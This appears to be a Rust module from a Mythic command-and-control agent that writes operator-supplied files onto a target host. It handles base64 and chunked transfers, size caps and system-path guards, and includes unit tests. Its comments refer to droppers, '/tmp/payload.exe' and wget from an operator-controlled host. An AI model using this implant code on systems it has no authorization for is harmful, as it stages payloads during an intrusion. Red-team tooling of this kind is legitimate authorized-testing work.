//! File upload (Mythic -> agent).
//!
//! Receives base64-encoded file bytes in task parameters, decodes them
//! **incrementally** with [`base64::DecoderReader`], and streams the result
//! to disk via a buffered writer. No allocation holds the full decoded
//! payload — memory is bounded to ~16 KiB regardless of upload size.
//!
//! Enforces a hard size cap (default 256 MiB) to prevent the agent from
//! filling the disk if the operator sends an oversized dropper, and refuses
//! writes to obviously destructive locations unless the operator sets
//! `allow_system_path: true`.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/tmp/payload.exe",
//!     "file_bytes": "<base64_encoded_contents>",
//!     "allow_system_path": false,  // optional, default false
//!     "max_bytes": 268435456        // optional, override cap (default 256 MiB)
//! }
//! ```

use std::collections::HashMap;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use base64::read::DecoderReader;
use mythic::{Artifact, TaskMessage, TaskResponse, TaskUpload};
use serde::Deserialize;
use uuid::Uuid;

use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
use crate::dispatch::PostResponseReceipt;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    /// Absolute path where the file should be written.
    path: String,
    /// Original filename from Mythic. Used when `path` points to a directory.
    #[serde(default)]
    original_filename: Option<String>,
    /// Base64-encoded file contents.
    #[serde(default)]
    file_bytes: Option<String>,
    /// Mythic file UUID for chunk-pull uploads.
    #[serde(default)]
    file_id: Option<Uuid>,
    /// When true, allows writes to system / boot directories that are
    /// usually destructive to overwrite. Default false.
    #[serde(default)]
    allow_system_path: bool,
    /// Override the decoded-size cap. Clamped to [1, MAX_UPLOAD_BYTES].
    #[serde(default)]
    max_bytes: Option<u64>,
    #[serde(default)]
    host: Option<String>,
}

// ── Constants ───────────────────────────────────────────────

/// Hard cap on decoded upload size. 256 MiB is enough for typical tooling
/// droppers; larger transfers should use `wget` against an
/// operator-controlled host. Memory is bounded to ~16 KiB regardless
/// (buffered reader + writer).
const MAX_UPLOAD_BYTES: u64 = 256 * 1024 * 1024;
const UPLOAD_CHUNK_SIZE: u32 = 512 * 1024;
/// Read chunk for the base64 DecoderReader. 16 KiB balances syscall
/// overhead against memory footprint.
const DECODE_CHUNK: usize = 16 * 1024;

struct PendingUpload {
    task_id: Uuid,
    file_id: Uuid,
    dest: PathBuf,
    display_dest: String,
    max_bytes: u64,
    written: u64,
    chunk_size: u32,
    next_chunk: u32,
    host: Option<String>,
}

static PENDING_UPLOADS: OnceLock<Mutex<HashMap<Uuid, PendingUpload>>> = OnceLock::new();

fn pending_uploads() -> &'static Mutex<HashMap<Uuid, PendingUpload>> {
    PENDING_UPLOADS.get_or_init(|| Mutex::new(HashMap::new()))
}

fn pending_uploads_lock() -> std::sync::MutexGuard<'static, HashMap<Uuid, PendingUpload>> {
    pending_uploads()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn clean_filename(name: &str) -> Option<String> {
    let normalized = normalize_user_path(name);
    Path::new(&normalized)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .filter(|n| !n.is_empty())
}

fn path_looks_like_dir(input: &str) -> bool {
    input.ends_with('/') || input.ends_with('\\')
}

fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<PathBuf, String> {
    let normalized = normalize_user_path(path);
    let filename = original_filename.and_then(clean_filename);
    if normalized.is_empty() {
        return filename
            .map(PathBuf::from)
            .ok_or_else(|| "upload path is empty and original filename is unavailable".into());
    }

    let dest = PathBuf::from(&normalized);
    if dest.is_dir() || path_looks_like_dir(&normalized) {
        let Some(filename) = filename else {
            return Err(format!(
                "upload destination {} is a directory but original filename is unavailable",
                display_path(&dest)
            ));
        };
        return Ok(dest.join(filename));
    }
    Ok(dest)
}

fn upload_request(state: &PendingUpload, chunk_num: u32) -> TaskResponse {
    TaskResponse {
        task_id: state.task_id,
        completed: Some(false),
        status: Some("processing".into()),
        user_output: Some(format!(
            "fetching upload chunk {} for {}",
            chunk_num, state.display_dest
        )),
        upload: Some(TaskUpload {
            chunk_size: state.chunk_size,
            file_id: state.file_id,
            chunk_num,
            full_path: Some(state.display_dest.clone()),
            host: state.host.clone(),
        }),
        ..Default::default()
    }
}

fn upload_complete_response(state: &PendingUpload) -> TaskResponse {
    TaskResponse {
        task_id: state.task_id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "uploaded {} bytes to {}",
            state.written, state.display_dest
        )),
        artifacts: vec![Artifact {
            base_artifact: "FileWrite".into(),
            artifact: state.display_dest.clone(),
            needs_cleanup: true,
            resolved: true,
        }],
        ..Default::default()
    }
}

fn cleanup_failed_upload(state: &PendingUpload, message: &str) -> TaskResponse {
    let _ = std::fs::remove_file(&state.dest);
    TaskResponse::failed(state.task_id, message)
}

pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
    let mut out = Vec::new();
    for receipt in receipts {
        let mut state = match pending_uploads_lock().remove(&receipt.task_id) {
            Some(state) => state,
            None => continue,
        };

        if let Some(error) = &receipt.error {
            out.push(cleanup_failed_upload(
                &state,
                &format!("upload chunk fetch failed: {error}"),
            ));
            continue;
        }
        if !receipt.status.is_empty() && receipt.status != "success" {
            out.push(cleanup_failed_upload(
                &state,
                &format!("upload chunk fetch failed with status {}", receipt.status),
            ));
            continue;
        }

        if receipt.file_id != Some(state.file_id) {
            out.push(cleanup_failed_upload(
                &state,
                "upload chunk response file_id did not match requested file",
            ));
            continue;
        }

        let Some(chunk_num) = receipt.chunk_num else {
            out.push(cleanup_failed_upload(
                &state,
                "upload chunk response did not include chunk_num",
            ));
            continue;
        };
        if chunk_num != state.next_chunk {
            out.push(cleanup_failed_upload(
                &state,
                &format!(
                    "upload chunk response was {chunk_num}, expected {}",
                    state.next_chunk
                ),
            ));
            continue;
        }

        let Some(chunk_data) = receipt.chunk_data.as_deref() else {
            out.push(cleanup_failed_upload(
                &state,
                "upload chunk response did not include chunk_data",
            ));
            continue;
        };
        let chunk = match STANDARD.decode(chunk_data.as_bytes()) {
            Ok(chunk) => chunk,
            Err(e) => {
                out.push(cleanup_failed_upload(
                    &state,
                    &format!("upload chunk base64 decode failed: {e}"),
                ));
                continue;
            }
        };
        if state.written + chunk.len() as u64 > state.max_bytes {
            out.push(cleanup_failed_upload(
                &state,
                &format!("decoded size exceeds cap {}", state.max_bytes),
            ));
            continue;
        }

        let file_result = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .append(chunk_num > 1)
            .truncate(chunk_num == 1)
            .open(&state.dest)
            .and_then(|mut file| file.write_all(&chunk));
        if let Err(e) = file_result {
            out.push(cleanup_failed_upload(
                &state,
                &format!("write {} failed: {e}", state.display_dest),
            ));
            continue;
        }
        state.written += chunk.len() as u64;

        let total_chunks = receipt.total_chunks.unwrap_or(chunk_num);
        if chunk_num >= total_chunks {
            info!(
                "[upload] wrote {} bytes to {}",
                state.written, state.display_dest
            );
            out.push(upload_complete_response(&state));
        } else {
            let next_chunk = chunk_num + 1;
            state.next_chunk = next_chunk;
            out.push(upload_request(&state, next_chunk));
            pending_uploads_lock().insert(state.task_id, state);
        }
    }
    out
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("upload parse error: {e}")),
    };

    // 1. Path guard — refuse to overwrite system paths unless explicit opt-in.
    let dest = match upload_destination(&params.path, params.original_filename.as_deref()) {
        Ok(path) => path,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };
    let path = dest.as_path();
    if !params.allow_system_path && is_protected_path(&display_path(path)) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing write to system path {}; set allow_system_path=true to override",
                display_path(path)
            ),
        );
    }

    // 2. Create parent directories if needed
    if let Some(parent) = path.parent()
        && !parent.as_os_str().is_empty()
        && let Err(e) = std::fs::create_dir_all(parent)
    {
        return TaskResponse::failed(
            task.id,
            &format!("create parent dir {} failed: {e}", display_path(parent)),
        );
    }

    let cap = params
        .max_bytes
        .unwrap_or(MAX_UPLOAD_BYTES)
        .clamp(1, MAX_UPLOAD_BYTES);

    if let Some(file_id) = params.file_id {
        let state = PendingUpload {
            task_id: task.id,
            file_id,
            dest: dest.clone(),
            display_dest: display_path(path),
            max_bytes: params
                .max_bytes
                .unwrap_or(MAX_UPLOAD_BYTES)
                .clamp(1, MAX_UPLOAD_BYTES),
            written: 0,
            chunk_size: UPLOAD_CHUNK_SIZE,
            next_chunk: 1,
            host: params.host.filter(|h| !h.trim().is_empty()),
        };
        let response = upload_request(&state, 1);
        pending_uploads_lock().insert(task.id, state);
        return response;
    }

    let Some(file_bytes) = params.file_bytes else {
        return TaskResponse::failed(task.id, "upload requires file_id or file_bytes");
    };

    // 3. Stream-decode base64 to disk. DecoderReader pulls from the input
    //    cursor and yields decoded bytes on demand — we never materialise
    //    the full decoded Vec.
    let cursor = std::io::Cursor::new(file_bytes.as_bytes());
    let mut decoder = DecoderReader::new(cursor, &STANDARD);

    let file = match std::fs::File::create(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("create {} failed: {e}", display_path(path)),
            );
        }
    };
    let mut writer = std::io::BufWriter::new(file);

    let mut buf = [0u8; DECODE_CHUNK];
    let mut written: u64 = 0;
    let decode_result: std::io::Result<()> = (|| {
        loop {
            let n = decoder
                .read(&mut buf)
                .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
            if n == 0 {
                break;
            }
            written += n as u64;
            if written > cap {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("decoded size exceeds cap {cap}"),
                ));
            }
            writer.write_all(&buf[..n])?;
        }
        writer.flush()?;
        Ok(())
    })();

    if let Err(e) = decode_result {
        // Best-effort cleanup of the partial file.
        let _ = std::fs::remove_file(path);
        return TaskResponse::failed(
            task.id,
            &format!("upload {} failed: {e}", display_path(path)),
        );
    }

    info!("[upload] wrote {} bytes to {}", written, display_path(path));
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "uploaded {} bytes to {}",
            written,
            display_path(path)
        )),
        artifacts: vec![Artifact {
            base_artifact: "FileWrite".into(),
            artifact: display_path(path),
            needs_cleanup: true,
            resolved: true,
        }],
        ..Default::default()
    }
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upload_and_verify() {
        use std::io::Read;

        let original = b"nanaz upload test payload\0with\0nulls";
        let encoded = crate::common::base64::encode(original);

        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push("nanaz_up_test.bin");
            p
        };

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_bytes": encoded,
            })
            .to_string(),
            ..Default::default()
        };

        let resp = handle(&task);
        assert!(resp.completed == Some(true));

        // Verify file was written correctly
        let mut f = std::fs::File::open(&tmp_path).unwrap();
        let mut buf = Vec::new();
        f.read_to_end(&mut buf).unwrap();
        let _ = std::fs::remove_file(&tmp_path);

        assert_eq!(buf, original);
    }

    #[test]
    fn test_upload_invalid_base64() {
        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: r#"{"path": "/tmp/test", "file_bytes": "!!!not-valid-base64!!!"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert!(resp.status.as_deref() == Some("error"));
    }

    #[test]
    fn test_upload_file_id_chunk_pull_and_verify() {
        let original = b"nanaz upload chunk pull";
        let file_id = Uuid::from_u128(0x1234);
        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push(format!("nanaz_up_chunk_test_{}.bin", std::process::id()));
            p
        };

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_id": file_id,
            })
            .to_string(),
            ..Default::default()
        };

        let request = handle(&task);
        assert_eq!(request.status.as_deref(), Some("processing"));
        let upload = request.upload.as_ref().expect("upload request set");
        assert_eq!(upload.file_id, file_id);
        assert_eq!(upload.chunk_num, 1);
        assert_eq!(
            upload.full_path.as_deref(),
            Some(tmp_path.to_string_lossy().as_ref())
        );

        let responses = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(file_id),
            chunk_num: Some(1),
            total_chunks: Some(1),
            chunk_data: Some(crate::common::base64::encode(original)),
            ..Default::default()
        }]);
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].completed, Some(true));
        assert!(responses[0].upload.is_none());
        assert_eq!(std::fs::read(&tmp_path).unwrap(), original);

        let _ = std::fs::remove_file(tmp_path);
    }

    #[test]
    fn test_upload_rejects_mismatched_file_id_receipt() {
        let file_id = Uuid::new_v4();
        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push(format!(
                "nanaz_up_bad_file_id_test_{}_{}.bin",
                std::process::id(),
                file_id
            ));
            p
        };

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_id": file_id,
            })
            .to_string(),
            ..Default::default()
        };
        let request = handle(&task);
        assert_eq!(request.status.as_deref(), Some("processing"));

        let responses = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(Uuid::new_v4()),
            chunk_num: Some(1),
            total_chunks: Some(1),
            chunk_data: Some(crate::common::base64::encode(b"wrong file")),
            ..Default::default()
        }]);
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].status.as_deref(), Some("error"));
        assert!(!tmp_path.exists());
    }

    #[test]
    fn test_upload_rejects_unexpected_chunk_number() {
        let file_id = Uuid::new_v4();
        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push(format!(
                "nanaz_up_bad_chunk_test_{}_{}.bin",
                std::process::id(),
                file_id
            ));
            p
        };

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_id": file_id,
            })
            .to_string(),
            ..Default::default()
        };
        let request = handle(&task);
        assert_eq!(request.status.as_deref(), Some("processing"));

        let responses = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(file_id),
            chunk_num: Some(2),
            total_chunks: Some(2),
            chunk_data: Some(crate::common::base64::encode(b"out of order")),
            ..Default::default()
        }]);
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].status.as_deref(), Some("error"));
        assert!(!tmp_path.exists());
    }

    #[test]
    fn test_upload_pending_state_crosses_worker_threads() {
        let original = b"threaded upload";
        let file_id = Uuid::new_v4();
        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push(format!(
                "nanaz_up_threaded_test_{}_{}.bin",
                std::process::id(),
                file_id
            ));
            p
        };

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_id": file_id,
            })
            .to_string(),
            ..Default::default()
        };
        let task_id = task.id;

        let request = std::thread::spawn(move || handle(&task)).join().unwrap();
        assert_eq!(request.status.as_deref(), Some("processing"));

        let responses = responses_from_receipts(&[PostResponseReceipt {
            task_id,
            status: "success".into(),
            file_id: Some(file_id),
            chunk_num: Some(1),
            total_chunks: Some(1),
            chunk_data: Some(crate::common::base64::encode(original)),
            ..Default::default()
        }]);
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].completed, Some(true));
        assert_eq!(std::fs::read(&tmp_path).unwrap(), original);

        let _ = std::fs::remove_file(tmp_path);
    }
}
